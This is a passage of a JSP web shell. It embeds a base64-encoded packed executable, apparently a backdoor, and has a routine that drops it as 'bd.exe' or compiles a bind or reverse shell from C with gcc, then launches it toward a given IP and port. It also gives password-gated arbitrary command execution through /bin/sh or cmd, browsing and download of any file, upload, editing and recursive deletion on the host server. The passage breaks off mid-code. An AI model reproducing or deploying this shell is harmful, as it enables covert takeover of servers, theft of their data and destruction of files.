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";
String script_name = request.getRequestURI();
String shell_style = "<style type=\"text/css\">" +
"*{" +
"	font-family:Tahoma,Verdana,Arial;" +
"	font-size:12px;" +
"	line-height:20px;" +
"}" +
"form{" +
"	margin:0 auto;" +
"	text-align:center;" +
"}" +
"body{" +
"	background:url('" + script_name + "?img=bg') #333333;" +
"	color:#ffffff;" +
"	margin:0;" +
"	padding:0;" +
"}" +
"input,textarea{" +
"	background:url('" + script_name + "?img=bg') #111111;" +
"	height:24px;" +
"	color:#ffffff;" +
"	padding:1.5px 4px 0 4px;" +
"	margin:2px 0;" +
"	border:1px solid " + shell_color + ";" +
"	border-bottom:4px solid " + shell_color + ";" +
"	vertical-align:middle;" +
"}" +
"input:hover,textarea:hover{" +
"	background:#0a0a0a;" +
"}" +
"a{" +
"	color:#ffffff;" +
"	text-decoration:none;" +
"}" +
"a:hover{" +
"	border-bottom:1px solid #ffffff;" +
"}" +
"h1{" +
"	font-size:17px;" +
"	height:20px;" +
"	padding:2px 8px;" +
"	background:" + shell_color + ";" +
"	border:0;" +
"	border-left:4px solid " + shell_color + ";" +
"	border-right:4px solid " + shell_color + ";" +
"	border-bottom:1px solid #222222;" +
"	margin:0 auto;" +
"	width:90%;" +
"}" +
"h1 img{" +
"	vertical-align:bottom;" +
"}" +
".box{" +
"	margin:0 auto;" +
"	background:#000000;" +
"	border:4px solid " + shell_color + ";" +
"	padding:4px 8px;" +
"	width:90%;" +
"	text-align:justify;" +
"}" +
".gaul{" +
"	color:" + shell_color + ";" +
"}" +
".result, .boxcode{" +
"	margin:0 auto;" +
"	border:1px solid " + shell_color + ";" +
"	font-family:Lucida Console,Tahoma,Verdana;" +
"	padding:8px;" +
"	text-align:justify;" +
"	overflow:hidden;" +
"	color:#ffffff;" +
"}" +
"#explorer, table{" +
"	width:100%;" +
"}" +
"table th{" +
"	border-bottom:1px solid " + shell_color + ";" +
"	background:#111111;" +
"	padding:4px;" +
"}" +
"table td{" +
"	padding:4px;" +
"	border-bottom:1px solid #111111;" +
"	vertical-align:top;" +
"}" +
".tblExplorer tr:hover, .hexview td:hover{" +
"	background:" + shell_color + ";" +
"}" +
".hidden{" +
"	display:none;" +
"}" +
".tblbox td  {" +
"	margin:0;" +
"	padding:0;" +
"	border-bottom:1px solid #222222;" +
"}" +
".tblbox tr:hover{" +
"	background:none;" +
"}" +
"#mainwrapper{" +
"	width:100%;" +
"	margin:20px auto;" +
"	text-align:center;" +
"}" +
"#wrapper{" +
"	width:90%;" +
"	margin:auto;" +
"}" +
".cmdbox{" +
"	border-top:1px solid " + shell_color + ";" +
"	border-bottom:1px solid " + shell_color + ";" +
"	margin:4px 0;" +
"	width:100%;" +
"}" +
".fpath{" +
"	border-top:1px solid " + shell_color + ";" +
"	border-bottom:1px solid " + shell_color + ";" +
"	margin:4px 0;" +
"	padding:4px 0;" +
"}" +
".fprop{" +
"	border-top:1px solid " + shell_color + ";" +
"	border-bottom:1px solid " + shell_color + ";" +
"	margin:4px 0;" +
"	padding:4px 0;" +
"}" +
".bottomwrapper{" +
"	text-align:center;" +
"}" +
".btn{" +
"	height:24px;" +
"	background:url('" + script_name + "?img=bg') #111111;" +
"	font-size:10px;" +
"	text-align:right;" +
"}" +
".hexview , .hexview td{" +
"	font-family: Lucida Console,Tahoma;" +
"}" +
"</style>";
%><%!
//################# FUNCTION GOES HERE #######################==============================================]
public String getSlash(){
	if(is_win()){
		return "\\";
	}
	return "/";
}
public boolean is_win(){
	if(System.getProperty("os.name").toLowerCase().substring(0,3).equals("win")){
		return true;
	}
	return false;
}
public String xcleanpath(String path){
	if(is_dir(path)){
		String xSlash = getSlash();
		if(path!=null && path.length() > 1){
			while(path.substring(path.length()-1).equals(xSlash)){
				path = path.substring(0,path.length()-1);
			}
			return path + xSlash;
		}
	}
	return path;
}
public String urlencode(String str){
	try{ if(str!=null) return URLEncoder.encode(str); } catch(Exception e){ }
	return str;
}
public String urldecode(String str){
	try{ if(str!=null) return URLDecoder.decode(str); } catch(Exception e){ }
	return str;
}
public String xparsedir(String dir){
	String xSlash = "";
	String xSlash_ = "";
	if(is_win()){
		xSlash = "\\";
		xSlash_ = "\\\\";
	}
	else{
		xSlash = "/";
		xSlash_ = "/";
	}
	String[] dirs = dir.split(xSlash_);
	StringBuffer buff = new StringBuffer("");
	StringBuffer dlink = new StringBuffer("");
	if(!is_win()){
		dlink.append(urlencode(xSlash));
		buff.append("<a href=\"?dir=" + dlink + "\">" + xSlash + "</a>&nbsp;");
	}
	for(int i=0;i<dirs.length;i++){
		String d = dirs[i].trim();
		if(!d.equals("")){
			dlink.append(urlencode(d + xSlash));
			buff.append("<a href=\"?dir=" + dlink + "\">" + d + " " + xSlash + "</a>&nbsp;");
		}
	}
	return "<span class=\"gaul\">[ </span>" + buff + "<span class=\"gaul\"> ]</span>";
}
public boolean is_file(String fpath){
	try{
		File myfile = new File(fpath);
		if(myfile.exists() && myfile.isFile()){	return true; }
	}
	catch(Exception e){  }
		return false;
}
public boolean is_dir(String fpath){
	try{
		File myfile = new File(fpath);
		if(myfile.exists() && myfile.isDirectory()){	return true; }
	}
	catch(Exception e){  }
		return false;
}
public String xparentfolder(String fpath){
	if(is_dir(fpath)){
		File myfile = new File(fpath);
		if(myfile.getParent()!=null) return myfile.getParent();
		else return fpath;
	}
	return fpath;
}
public String xfileopen(String fpath){
	try{
		StringBuffer content = new StringBuffer("");
		if(is_file(fpath)){
			FileInputStream fileinputstream = new FileInputStream(fpath);
			int numberBytes = fileinputstream.available();
			byte bytearray[] = new byte[numberBytes];
			fileinputstream.read(bytearray);
			for(int i = 0; i < numberBytes; i++){
				content.append((char) (bytearray[i]));
			}
			fileinputstream.close();
		}
		return content.toString();
	}
	catch (Exception e) {
	}
	return "";
}
public boolean xfilesave(String fullPath, byte[] bytes){
	try{
		OutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(fullPath));
		InputStream inputStream = new ByteArrayInputStream(bytes);
		int token = -1;
		while((token = inputStream.read()) != -1){
			bufferedOutputStream.write(token);
		}
		bufferedOutputStream.flush();
		bufferedOutputStream.close();
		inputStream.close();
	}
	catch(Exception e){ return false; }
	if(is_file(fullPath)){
		return true;
	}
	return false;
}
public boolean xfilesave(String fullPath, String text){
	Writer writer = null;
	try{
		File myFile = new File(fullPath);
		writer = new BufferedWriter(new FileWriter(myFile));
		writer.write(text);
		writer.close();
	}
	catch (Exception e)  { return false; }
	if(is_file(fullPath)){
		return true;
	}
	return false;
}
public void xrmdir(String fdir){
	File mypath = new File(fdir);

	File[] allitem = mypath.listFiles();
	for(int i=0;i<allitem.length;i++){
		if(allitem[i].isDirectory()){
			xrmdir(allitem[i].getAbsolutePath());
		}
		else{
			allitem[i].delete();
		}
	}
	mypath.delete();
}
public long xfilesize(String fpath){
	if(is_file(fpath)){
		File myfile = new File(fpath);
		return myfile.length();
	}
	return 0;
}
public String xparsefilesize(long size_){
	NumberFormat pola = new DecimalFormat("#.00");
	Double pecahan = null;
	Double size = (double) size_;
	if(size <= 1024) {
		return size.toString().replace(".0","");
	}
	else{
		if(size <= 1024*1024) {
			pecahan = ((double) size) / 1024;
			return pola.format(pecahan).replace(",",".") + " kb";
		}
		else {
			pecahan = ((double)  size) / 1024 / 1024;
			return pola.format(pecahan).replace(",",".") + " mb";
		}
	}
}
public String xfileperms(String fpath){
	String isreadable = "-";
	String iswriteable = "-";
	File myd = new File(fpath);
	if(myd.canRead()) isreadable = "r";
	if(myd.canWrite()) iswriteable = "w";
	return isreadable + " / " + iswriteable;
}
public String xdrive(){
	File roots[] = File.listRoots();
	String letter = "";
	if(is_win()){
		StringBuffer letters = new StringBuffer("");
		for(int i=0;i<roots.length;i++){
			letter = roots[i].toString();
			letters.append("<a href=\"?dir=" + letter + "\"><span class=\"gaul\">[ </span>");
			letters.append(letter.substring(0,1));
			letters.append("<span class=\"gaul\"> ]</span</a>&nbsp;");
		}
		letters.append("<br />");
		return letters.toString();
	}
	return "";
}
public String xfilelastmodified(String fpath){
	if(is_file(fpath) || is_dir(fpath)){
		File myfile = new File(fpath);
		return new SimpleDateFormat("dd-MMM-yyyy HH:mm").format(new java.util.Date(myfile.lastModified()));
	}
	return "???";
}
public String xfilesummary(String fpath){
	if(is_file(fpath)){
		return "Filesize : " + xparsefilesize(xfilesize(fpath)) + " ( " + xfilesize(fpath) + " ) <span class=\"gaul\"> :: </span>Permission : " + xfileperms(fpath) + " <span class=\"gaul\"> :: </span>modified : " + xfilelastmodified(fpath);
	}
	return "";
}
public boolean xrunexploit(String fpath,String base64,String port,String ip){
	String finals = "";
	byte[] embrio = b64decode(base64);
	String tmpdir = xcleanpath(System.getProperty("java.io.tmpdir"));
	String fname = "";
	String xpath = "";
	boolean ok = false;
	if(is_win()){
		fname = "bd.exe";
		xpath = xcleanpath(fpath) + fname;
		if(is_file(xpath)){
			File xfile = new File(xpath);
			xfile.delete();

		}
		if(!xfilesave(xpath,embrio)){
			xpath = tmpdir + fname;
			if(xfilesave(xpath,embrio)) ok = true;
		}
		else ok = true;

		if(ok){
			finals = xpath + " " + port + " " + ip;
			try {
				Process p = Runtime.getRuntime().exec(finals);
			}
			catch(Exception e) { return false; }
			return true;
		}
	}
	else {
		if(!ip.equals("")) fname = "back";
		else fname = "bind";
		String ypath = xcleanpath(fpath) + fname;
		if(is_file(ypath + ".c")){
			File yfile = new File(xpath + ".c");
			yfile.delete();
		}
		if(!xfilesave(ypath + ".c",embrio)){
			xpath = tmpdir + fname;
			if(xfilesave(xpath,embrio)) ok = true;
		}
		else ok = true;

		if(ok){
			ekse("gcc " + ypath + ".c -o " + ypath,fpath );
			ekse("chmod +x " + ypath,fpath);
			if(is_file(ypath)){
				finals = ypath + " " + port + " " + ip;
				try{
					Process p = Runtime.getRuntime().exec(finals);
				}
				catch(Exception e){ return false; }
				return true;
			}
			else return false;
		}
	}
	return false;
}
String ekse(String cmd, String cwd){
	String[] comm = new String[3];
	if(!is_win()){
		comm[0] = "/bin/sh";comm[1] = "-c";comm[2] = cmd;
	}else{
		comm[0] = "cmd";comm[1] = "/C";comm[2] = cmd;
	}
	StringBuffer ret = new StringBuffer();
	long start = System.currentTimeMillis();
	try {
		Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(cwd));
		//Get input and error streams
		BufferedInputStream ls_in = new BufferedInputStream(ls_proc.getInputStream());
		BufferedInputStream ls_err = new BufferedInputStream(ls_proc.getErrorStream());
		boolean end = false;
		while (!end) {
			int c = 0;
			while ((ls_err.available() > 0) && (++c <= 1000)) {
				ret.append((char) ls_err.read());
			}
			c = 0;
			while ((ls_in.available() > 0) && (++c <= 1000)) {
				ret.append((char) ls_in.read());
			}
			try {
				ls_proc.exitValue();
				//if the process has not finished, an exception is thrown
				//else
				while (ls_err.available() > 0)
					ret.append((char) ls_err.read());
				while (ls_in.available() > 0)
					ret.append((char) ls_in.read());
				end = true;
			}
			catch (IllegalThreadStateException ex) {
				//Process is running
			}
			try {
				Thread.sleep(50);
			}
			catch (InterruptedException ie) {}
		}
	}
	catch (IOException e) {
		ret.append("Error: " + e);
	}
	return ret.toString();
}
public String xdir(String fdir){
	String path = xcleanpath(urldecode(fdir));
	StringBuffer buff = new StringBuffer("");
	if(is_dir(path)){
		File mypath = new File(fdir);
		ArrayList fname = new ArrayList();
		ArrayList dname = new ArrayList();

		String[] allitem = mypath.list();
		for(int i=0;i<allitem.length;i++){
			String checkthis = allitem[i].toString();
			if(is_dir(path + checkthis)){
				dname.add(checkthis);
			}
			else{
				fname.add(checkthis);
			}
		}
		Collections.sort(fname, new myComparator());
		Collections.sort(dname, new myComparator());

		buff.append("<div id=\"explorer\"><table class=\"tblExplorer\">" +
		"<tr><th>Filename</th>" +
		"<th style=\"width:80px;\">Filesize</th>" +
		"<th style=\"width:80px;\">Permission</th>" +
		"<th style=\"width:150px;\">Last Modified</th>" +
		"<th style=\"width:180px;\">Action</th></tr>");

		if (path.length() > 3){
			String sd = ".";
			String d = xcleanpath(path);
			String nextdir = xcleanpath(xparentfolder(d));
			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=" + urlencode(d) + "';\">");
			buff.append("<td><span style=\"font-weight:bold;\"><a href=\"?dir=" + d + "\">[</span> "+ sd + " <span style=\"font-weight:bold;\">]</span></a></td>");
			buff.append("<td>DIR</td>");
			buff.append("<td style=\"text-align:center;\">" + xfileperms(d) + "</td>");
			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(d) + "</td>");
			buff.append("<td style=\"text-align:center;\"><a href=\"?dir=" + path + "&properties=" + d + "\">Properties</a> | <a href=\"?dir=" + nextdir + "&del=" + d + "\">Remove</a></td>");
			buff.append("</tr>");
			sd = "..";
			d = xcleanpath(xparentfolder(path));
			nextdir = xcleanpath(xparentfolder(d));
			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=" + urlencode(d) + "';\">");
			buff.append("<td><span style=\"font-weight:bold;\"><a href=\"?dir=" + d + "\">[</span> "+ sd + " <span style=\"font-weight:bold;\">]</span></a></td>");
			buff.append("<td>DIR</td>");
			buff.append("<td style=\"text-align:center;\">" + xfileperms(d) + "</td>");
			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(d) + "</td>");
			buff.append("<td style=\"text-align:center;\"><a href=\"?dir=" + d + "&properties=" + d + "\">Properties</a> | <a href=\"?dir=" + nextdir + "&del=" + d + "\">Remove</a></td>");
			buff.append("</tr>");
		}
		for(int i=0;i<dname.size();i++){
			String sd = dname.get(i).toString().trim().replace("\\","\\\\");
			String d = path + sd.trim();
			String nextdir = xcleanpath(d);
			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location= '?dir=" + urlencode(nextdir) + "';\">");
			buff.append("<td><span style=\"font-weight:bold;\"><a href=\"?dir=" + nextdir + "\">[</span> "+ sd + " <span style=\"font-weight:bold;\">]</span></a></td>");
			buff.append("<td>DIR</td>");
			buff.append("<td style=\"text-align:center;\">" + xfileperms(nextdir) + "</td>");
			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(nextdir) + "</td>");
			buff.append("<td style=\"text-align:center;\"><a href=\"?dir=" + path + "&properties=" + nextdir + "\">Properties</a> | <a href=\"?dir=" + path + "&del=" + xcleanpath(nextdir) + "\">Remove</a></td>");
			buff.append("</tr>");
		}
		for(int i=0;i<fname.size();i++){
			String sf = fname.get(i).toString().trim();
			String f = path + sf;
			String view = "?dir=" + urlencode(path) + "&view=" + urlencode(f);
			buff.append("<tr onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\" onclick=\"window.location='?dir=" + urlencode(xcleanpath(path)) + "&properties=" + urlencode(f) + "';\"><td>");
			buff.append("<a href=\"?dir=" + urlencode(xcleanpath(path)) + "&properties=" + urlencode(f) + "\">");
			buff.append(sf + "</a></td>");
			buff.append("<td>" + xparsefilesize(xfilesize(f)) + "</td>");
			buff.append("<td style=\"text-align:center;\">" + xfileperms(f) + "</td>");
			buff.append("<td style=\"text-align:center;\">" + xfilelastmodified(f) + "</td>");
			buff.append("<td style=\"text-align:center;\"><a href=\"" + view + "\">Edit</a> | <a href=\"?get=" + f + "\">Download</a> | <a href=\"?dir=" + xcleanpath(path) + "&del=" + f + "\">Remove</a></td>");
			buff.append("</tr>");
		}
		buff.append("</table></div>");
	}
	return buff.toString();
}
public boolean is_numeric(String str){
	return str.matches("\\d+");
}
public void chdir(String directory) {
  System.setProperty("user.dir",directory);
}
public byte[] b64decode(String str){
	BASE64Decoder myDec = new BASE64Decoder();
	byte[] decoded = null;
	try{ decoded = myDec.decodeBuffer(str); }
	catch(Exception e){ }
	return decoded;
}
public String htmlspecialchars(String scode){
	StringBuffer sb = new StringBuffer();
	for(int i=0; i<scode.length(); i++) {
		char c = scode.charAt(i);
		switch (c) {
			case '<' 	:sb.append("&lt;");break;
			case '>' 	:sb.append("&gt;");break;
			case '&' 	:sb.append("&amp;");break;
			case '"' 	:sb.append("&quot;");break;
			case '\''	:sb.append("&apos;");break;
			case ' '	:sb.append("&nbsp;");break;
			default		:sb.append(c);
		}
	}
	return sb.toString();
}
public boolean is_image(String fpath){
	FileNameMap fileNameMap = URLConnection.getFileNameMap();
	String contentType = fileNameMap.getContentTypeFor(fpath);
	if(contentType!=null && contentType.toLowerCase().startsWith("image")){ return true; }
	return false;
}
class myComparator implements Comparator {
	public int compare(Object o1, Object o2) {
		String s1 = (String) o1;
		String s2 = (String) o2;
		return s1.toLowerCase().compareTo(s2.toLowerCase());
	}
}
public class FileInfo {
	public String name = null, clientFileName = null, fileContentType = null;
	private byte[] fileContents = null;
	public File file = null;
	public StringBuffer sb = new StringBuffer(100);

	public void setFileContents(byte[] aByteArray) {
		fileContents = new byte[aByteArray.length];
		System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
	}
}
public class HttpMultiPartParser {
	//private final String lineSeparator = System.getProperty("line.separator", "\n");
	private final int ONE_MB = 1024 * 1;

	public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,
			int clength) throws IllegalArgumentException, IOException {
		if (is == null) throw new IllegalArgumentException("InputStream");
		if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(
				"\"" + boundary + "\" is an illegal boundary indicator");
		boundary = "--" + boundary;
		StringTokenizer stLine = null, stFields = null;
		FileInfo fileInfo = null;
		Hashtable dataTable = new Hashtable(5);
		String line = null, field = null, paramName = null;
		boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
		boolean isFile = false;
		if (saveFiles) { // Create the required directory (including parent dirs)
			File f = new File(saveInDir);
			f.mkdirs();
		}
		line = getLine(is);
		if (line == null || !line.startsWith(boundary)) throw new IOException(
				"Boundary not found; boundary = " + boundary + ", line = " + line);
		while (line != null) {
			if (line == null || !line.startsWith(boundary)) return dataTable;
			line = getLine(is);
			if (line == null) return dataTable;
			stLine = new StringTokenizer(line, ";\r\n");
			if (stLine.countTokens() < 2) throw new IllegalArgumentException(
					"Bad data in second line");
			line = stLine.nextToken().toLowerCase();
			if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(
					"Bad data in second line");
			stFields = new StringTokenizer(stLine.nextToken(), "=\"");
			if (stFields.countTokens() < 2) throw new IllegalArgumentException(
					"Bad data in second line");
			fileInfo = new FileInfo();
			stFields.nextToken();
			paramName = stFields.nextToken();
			isFile = false;
			if (stLine.hasMoreTokens()) {
				field = stLine.nextToken();
				stFields = new StringTokenizer(field, "=\"");
				if (stFields.countTokens() > 1) {
					if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {
						fileInfo.name = paramName;
						String value = stFields.nextToken();
						if (value != null && value.trim().length() > 0) {
							fileInfo.clientFileName = value;
							isFile = true;
						}
						else {
							line = getLine(is); // Skip "Content-Type:" line
							line = getLine(is); // Skip blank line
							line = getLine(is); // Skip blank line
							line = getLine(is); // Position to boundary line
							continue;
						}
					}
				}
				else if (field.toLowerCase().indexOf("filename") >= 0) {
					line = getLine(is); // Skip "Content-Type:" line
					line = getLine(is); // Skip blank line
					line = getLine(is); // Skip blank line
					line = getLine(is); // Position to boundary line
					continue;
				}
			}
			boolean skipBlankLine = true;
			if (isFile) {
				line = getLine(is);
				if (line == null) return dataTable;
				if (line.trim().length() < 1) skipBlankLine = false;
				else {
					stLine = new StringTokenizer(line, ": ");
					if (stLine.countTokens() < 2) throw new IllegalArgumentException(
							"Bad data in third line");
					stLine.nextToken(); // Content-Type
					fileInfo.fileContentType = stLine.nextToken();
				}
			}
			if (skipBlankLine) {
				line = getLine(is);
				if (line == null) return dataTable;
			}
			if (!isFile) {
				line = getLine(is);
				if (line == null) return dataTable;
				dataTable.put(paramName, line);
				// If parameter is dir, change saveInDir to dir
				if (paramName.equals("dir")) saveInDir = line;
				line = getLine(is);
				continue;
			}
			try {
				OutputStream os = null;
				String path = null;
				if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,
						fileInfo.clientFileName));
				else os = new ByteArrayOutputStream(ONE_MB);
				boolean readingContent = true;
				byte previousLine[] = new byte[2 * ONE_MB];
				byte temp[] = null;
				byte currentLine[] = new byte[2 * ONE_MB];
				int read, read3;
				if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {
					line = null;
					break;
				}
				while (readingContent) {
					if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {
						line = null;
						break;
					}
					if (compareBoundary(boundary, currentLine)) {
						os.write(previousLine, 0, read - 2);
						line = new String(currentLine, 0, read3);
						break;
					}
					else {
						os.write(previousLine, 0, read);
						temp = currentLine;
						currentLine = previousLine;
						previousLine = temp;
						read = read3;
					}//end else
				}//end while
				os.flush();
				os.close();
				if (!saveFiles) {
					ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
					fileInfo.setFileContents(baos.toByteArray());
				}
				else fileInfo.file = new File(path);
				dataTable.put(paramName, fileInfo);
			}//end try
			catch (IOException e) {
				throw e;
			}
		}
		return dataTable;
	}

	/**
	 * Compares boundary string to byte array
	 */
	private boolean compareBoundary(String boundary, byte ba[]) {
		if (boundary == null || ba == null) return false;
		for (int i = 0; i < boundary.length(); i++)
			if ((byte) boundary.charAt(i) != ba[i]) return false;
		return true;
	}

	/** Convenience method to read HTTP header lines */
	private synchronized String getLine(ServletInputStream sis) throws IOException {
		byte b[] = new byte[1024];
		int read = sis.readLine(b, 0, b.length), index;
		String line = null;
		if (read != -1) {
			line = new String(b, 0, read);
			if ((index = line.indexOf('\n')) >= 0) line = line.substring(0, index - 1);
		}
		return line;
	}

	public String getFileName(String dir, String fileName) throws IllegalArgumentException {
		String path = null;
		if (dir == null || fileName == null) throw new IllegalArgumentException(
				"dir or fileName is null");
		int index = fileName.lastIndexOf('/');
		String name = null;
		if (index >= 0) name = fileName.substring(index + 1);
		else name = fileName;
		index = name.lastIndexOf('\\');
		if (index >= 0) fileName = name.substring(index + 1);
		path = dir + File.separator + fileName;
		if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);
		else return path.replace('/', File.separatorChar);
	}
} //End of class HttpMultiPartParser

Hashtable cookieTable(Cookie[] cookies) {
	Hashtable cookieTable = new Hashtable();
	if (cookies != null) {
		for (int i=0; i < cookies.length; i++)
			cookieTable.put(cookies[i].getName(), cookies[i].getValue());
	}
	return cookieTable;
}

%><%
//################# INIT GOES HERE #######################==================================================]
//String xCwd_ = getServletConfig().getServletContext().getRealPath(request.getRequestURI());
String xCwd_ = getServletConfig().getServletContext().getRealPath(request.getRequestURI());
String xCwd = xCwd_.substring(0,xCwd_.lastIndexOf(getSlash()));
chdir(xCwd);

String result = "";
String check = "";
Hashtable _COOKIE = cookieTable(request.getCookies());
Cookie myCookie;
boolean auth = false;
if((request.getParameter("passw")!=null) && (!request.getParameter("passw").equals(""))){
	check = request.getParameter("passw").trim();
	if(check.equals(shell_password)){
		myCookie = new Cookie("pass",check);
		myCookie.setMaxAge(3600*24*7);
		response.addCookie(myCookie);
	}
	else {
		myCookie = new Cookie("pass","");
		myCookie.setMaxAge(0);
		response.addCookie(myCookie);
	}
}
if(_COOKIE.containsKey("pass")) {
	check = (String) _COOKIE.get("pass");
}

if(check.equals(shell_password)){
	auth = true;
}
else auth = false;


if((request.getParameter("img")!=null) && (!request.getParameter("img").equals(""))){
	String myfile = request.getParameter("img");
	if(is_file(myfile)){
		response.setContentType("image/png");
		OutputStream o = response.getOutputStream();
		FileInputStream fis = new FileInputStream(myfile);
		int i;
		while ((i=fis.read()) != -1){ o.write(i); }
		fis.close();
		o.flush();
		o.close();
		return;
	}
	else{
		String file = "";
		if(myfile.equals("icon")){
			file = icon;
		}
		else if(myfile.equals("bg")){
			file = bg;
		}
		byte[] data = b64decode(file);
		response.setContentType("image/png");
		OutputStream o = response.getOutputStream();
        o.write(data);
		o.flush();
		o.close();
		return;
    }
}
if((request.getParameter("get")!=null) && (!request.getParameter("get").equals(""))){
	String myfile = request.getParameter("get");
	File myfile__ = new File(myfile);
	response.setContentType("application/octet-stream");
	response.setHeader("Content-Disposition","attachment; filename=\"" + myfile__.getName() + "\"");
	OutputStream o = response.getOutputStream();
	FileInputStream fis = new FileInputStream(myfile);
	int i;
	while ((i=fis.read()) != -1){ o.write(i); }
	fis.close();o.flush();o.close();
	return;
}


if((request.getParameter("dir")!=null) && (!request.getParameter("dir").equals(""))){
	String newdir = xcleanpath(urldecode(request.getParameter("dir").trim()));
	if((request.getParameter("oldfilename")!=null) && (!request.getParameter("oldfilename").equals(""))){
		if((request.getParameter("properties")!=null) && (!request.getParameter("properties").equals(""))){
			newdir = xcleanpath(xparentfolder(request.getParameter("oldfilename")));
		}
	}
	if(is_dir(newdir)){
		chdir(newdir);
		xCwd = newdir;
	}
	else if(is_file(newdir)){
		newdir = newdir.substring(0,newdir.lastIndexOf(getSlash()));
		if(is_dir(newdir)){
			chdir(newdir);
			xCwd = newdir;
		}
	}

	if((request.getParameter("foldername")!=null) && (!request.getParameter("foldername").equals(""))){
		File myFile = new File(xcleanpath(xCwd + request.getParameter("foldername")));
		if(!myFile.exists()) myFile.mkdir();
	}
	else if((request.getParameter("del")!=null) && (!request.getParameter("del").equals(""))){
		String fdel = request.getParameter("del");
		if(is_file(fdel)) new File(fdel).delete();
		else if(is_dir(fdel)){
			xrmdir(fdel);
